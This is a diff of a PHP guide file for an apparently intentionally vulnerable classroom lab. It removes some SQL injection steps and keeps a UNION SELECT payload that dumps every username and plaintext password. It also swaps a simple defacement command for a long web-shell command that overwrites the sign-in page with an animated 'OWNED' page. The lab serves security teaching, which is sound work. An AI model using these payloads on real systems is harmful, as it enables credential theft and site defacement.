@@ -28,66 +28,12 @@ $GUIDE = [
  'see' => 'A red <strong>SQL error</strong> - the database\'s own complaint, printed on the page. That only happens if your text arrived as part of the instruction instead of as data.',
 ],
 
-['t' => 'See what you are standing inside',
- 'b' => '<p>The page builds its query by pasting your text straight in:</p><pre><code>... WHERE us.username LIKE \'%YOUR TEXT%\' ORDER BY a.id DESC</code></pre><p>Your apostrophe closed that string early and the leftovers stopped making sense.</p><p>So do it on purpose: close the string, write your own SQL, and comment the leftovers away with <code>-- -</code>.</p>',
- 'see' => 'Nothing yet. Every payload below is that same shape.',
-],
-
-['t' => 'Count the columns',
- 'b' => '<p>To bolt your own row on, you must match the number of columns the page already selects. Ask it to sort by column 5, then by column 6.</p>',
- 'try' => [
-     'Five' => '\' ORDER BY 5 -- -',
-     'Six' => '\' ORDER BY 6 -- -',
- ],
- 'see' => 'Five sorts fine. Six answers <code>Unknown column \'6\' in \'order clause\'</code>. So there are exactly five.',
-],
-
-['t' => 'Add a row of your own',
- 'b' => '<p><code>UNION SELECT</code> joins a second set of results onto the first. Five columns, so five values.</p><p>Start the name with <code>zzz</code>, which matches no real applicant. Then the only row left on screen is the one you added.</p>',
- 'try' => [
-     'Applicant name' => 'zzz\' UNION SELECT 1,2,3,4,5 -- -',
- ],
- 'see' => 'One row, and it is not an application anybody filed. The numbers you can read are the columns that reach the screen - <strong>2</strong> under Applicant and <strong>5</strong> under Date.',
-],
-
-['t' => 'Ask the database about itself',
- 'b' => '<p>Swap the numbers you can see for questions.</p>',
- 'try' => [
-     'Applicant name' => 'zzz\' UNION SELECT 1,database(),3,4,version() -- -',
- ],
- 'see' => 'The Applicant column now reads <code>uam_db</code>, and the Date column reads the server version. You are choosing what the page prints - and what it prints does not have to fit the column it lands in.',
-],
-
-['t' => 'List the tables',
- 'b' => '<p>Every MySQL server keeps a description of itself in <code>information_schema</code>. <code>GROUP_CONCAT</code> folds many rows into one so they fit in a single field.</p>',
- 'try' => [
-     'Applicant name' => 'zzz\' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database() -- -',
- ],
- 'see' => 'The whole table list, <code>users</code> among them.',
-],
-
-['t' => 'List the columns of users',
- 'b' => '<p>Same question, one level down. <code>table_schema=database()</code> keeps the answer to this site\'s own tables - the server has internal ones called <code>users</code> too.</p>',
- 'try' => [
-     'Applicant name' => 'zzz\' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name=\'users\' AND table_schema=database() -- -',
- ],
- 'see' => '<code>username</code> and <code>password</code> are both there. Nothing is stopping you asking for them.',
-],
-
 ['t' => 'Read every username and password',
  'b' => '<p>One row per account: the Applicant column is the username, the Date column holds the password - not a date at all, just whatever you told the page to print there.</p>',
  'try' => [
      'Applicant name' => 'zzz\' UNION SELECT 1,username,3,4,password FROM users -- -',
  ],
  'see' => 'Forty-two accounts, and their passwords are <strong>just sitting there</strong>. Not hashes to crack - the passwords. Page through them and notice how many are the same.',
-],
-
-['t' => 'Take the administrator\'s',
- 'b' => '<p>Narrow it to the one account that matters.</p>',
- 'try' => [
-     'Applicant name' => 'zzz\' UNION SELECT 1,username,3,4,password FROM users WHERE is_admin=1 -- -',
- ],
- 'see' => '<code>admin</code> and its password. It is not a weak password. It did not need to be.',
 ],
 
 ['t' => 'Sign in as the administrator',
@@ -134,12 +80,12 @@ $GUIDE = [
 ],
 
 ['t' => 'Deface the sign-in page',
- 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it.</p>',
+ 'b' => '<p>Write a new sign-in page. The shell runs in its own folder, so <code>home.html</code> lands where the site will find it. The command is one line - press COPY, do not retype it.</p>',
  'try' => [
-     'Run' => $u . '/shell.php?c=echo "<h1>OWNED BY WEEK 1</h1>" > home.html',
+     'Run' => $u . '/shell.php?c=echo "<!DOCTYPE html><html><head><title>OWNED</title><style>body{background:rgb(34,34,34);color:white;font-family:monospace;text-align:center;margin:0;padding-top:20px;overflow:hidden}marquee{background:green;color:white;font-size:20px;padding:6px 0;font-weight:bold}h1{font-size:3em;margin:20px 0 4px;text-shadow:0 0 0.6em red}h2{font-size:1.6em;margin:0 0 20px;text-shadow:0 0 0.6em red}.tag{font-size:1.4em;color:white;min-height:1.6em;position:relative;z-index:2}.line{font-size:1em;margin:6px;opacity:0.85;position:relative;z-index:2}.credit{font-size:0.85em;color:gray;margin-top:24px;position:relative;z-index:2}@keyframes rain{from{top:-30px;opacity:1}to{top:110vh;opacity:0}}</style></head><body><marquee>WEEK 1  SECURITY CLASS  NO MERCY FOR UNVALIDATED UPLOADS</marquee><h1>SYSTEM COMPROMISED</h1><h2>a bored student with a browser</h2><p class=tag id=tag>loading...</p><p class=line>root access obtained via one unrestricted file upload</p><p class=credit>This is a classroom simulation. Please do not actually go to jail.</p><script>var GLITCH = [\'A\',\'B\',\'X\',\'Z\',\'0\',\'1\',\'9\',\'.\',\'-\',\'_\',\'(\',\')\',\'[\',\']\',\'<\',\'>\',\'=\',\'?\',\'/\',\':\',\';\'];function Scramble(el){    this.el = el;    this.frame = 0;}Scramble.prototype.setText = function(newText){    var oldText = this.el.textContent;    var length = Math.max(oldText.length, newText.length);    this.queue = [];    for (var i = 0; i < length; i = i - -1) {        var from = oldText[i] || \'\';        var to = newText[i] || \'\';        var start = Math.floor(Math.random()*20);        var end = start - -Math.floor(Math.random()*20);        this.queue.push({from:from,to:to,start:start,end:end,char:null});    }    this.frame = 0;    this.update();};Scramble.prototype.update = function(){    while (this.el.firstChild) { this.el.removeChild(this.el.firstChild); }    var complete = 0;    for (var i = 0; i < this.queue.length; i = i - -1) {        var item = this.queue[i];        if (this.frame >= item.end) {            complete = complete - -1;            this.el.appendChild(document.createTextNode(item.to));        } else if (this.frame >= item.start) {            if (!item.char || Math.random() < 0.3) {                item.char = GLITCH[Math.floor(Math.random()*GLITCH.length)];            }            var span = document.createElement(\'span\');            span.style.color = \'gray\';            span.appendChild(document.createTextNode(item.char));            this.el.appendChild(span);        } else {            this.el.appendChild(document.createTextNode(item.from));        }    }    if (complete === this.queue.length) { return; }    this.frame = this.frame - -1;    var self = this;    requestAnimationFrame(function(){ self.update(); });};var PHRASES = [\'SYSTEM COMPROMISED\',\'WEEK 1 SECURITY CLASS\',\'YOU HAD ONE JOB: VALIDATE THE UPLOAD\',\'NO REAL DAMAGE. JUST VIBES.\',\'THIS COULD HAVE BEEN YOUR SERVER\'];var tagEl = document.getElementById(\'tag\');var scramble = new Scramble(tagEl);var idx = 0;function nextPhrase(){    scramble.setText(PHRASES[idx]);    idx = idx - -1;    if (idx >= PHRASES.length) { idx = 0; }    setTimeout(nextPhrase, 2200);}nextPhrase();var RAIN_WORDS = [\'ROOT\',\'PWNED\',\'SHELL\',\'WEEK 1\',\'ACCESS\',\'0DAY\',\'HACKED\',\'OOPS\'];var SIZES = [14,16,18,20,22,24];var DURATIONS = [4,5,6,7];function dropWord(){    var word = RAIN_WORDS[Math.floor(Math.random()*RAIN_WORDS.length)];    var span = document.createElement(\'span\');    span.textContent = word;    span.style.position = \'absolute\';    span.style.color = \'red\';    span.style.opacity = \'0.6\';    span.style.fontFamily = \'monospace\';    var leftPct = Math.floor(Math.random()*90);    span.style.left = [leftPct,\'vw\'].join(\'\');    var size = SIZES[Math.floor(Math.random()*SIZES.length)];    span.style.fontSize = [size,\'px\'].join(\'\');    var duration = DURATIONS[Math.floor(Math.random()*DURATIONS.length)];    span.style.top = \'-30px\';    span.style.animation = [\'rain \',duration,\'s linear forwards\'].join(\'\');    document.body.appendChild(span);    setTimeout(function(){        if (span.parentNode) { span.parentNode.removeChild(span); }    }, duration*1000);}setInterval(dropWord, 400);dropWord();</script></body></html>" > home.html',
      '--1' => 'Now open the portal\'s sign-in page.',
  ],
- 'see' => 'The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
+ 'see' => 'A scrolling banner, a scrambling phrase, words raining down the screen. The sign-in page is gone. That is the <strong>I</strong> in the CIA triad - integrity - and it is the version of this your users notice.',
 ],
 
 ['t' => 'Put it back',
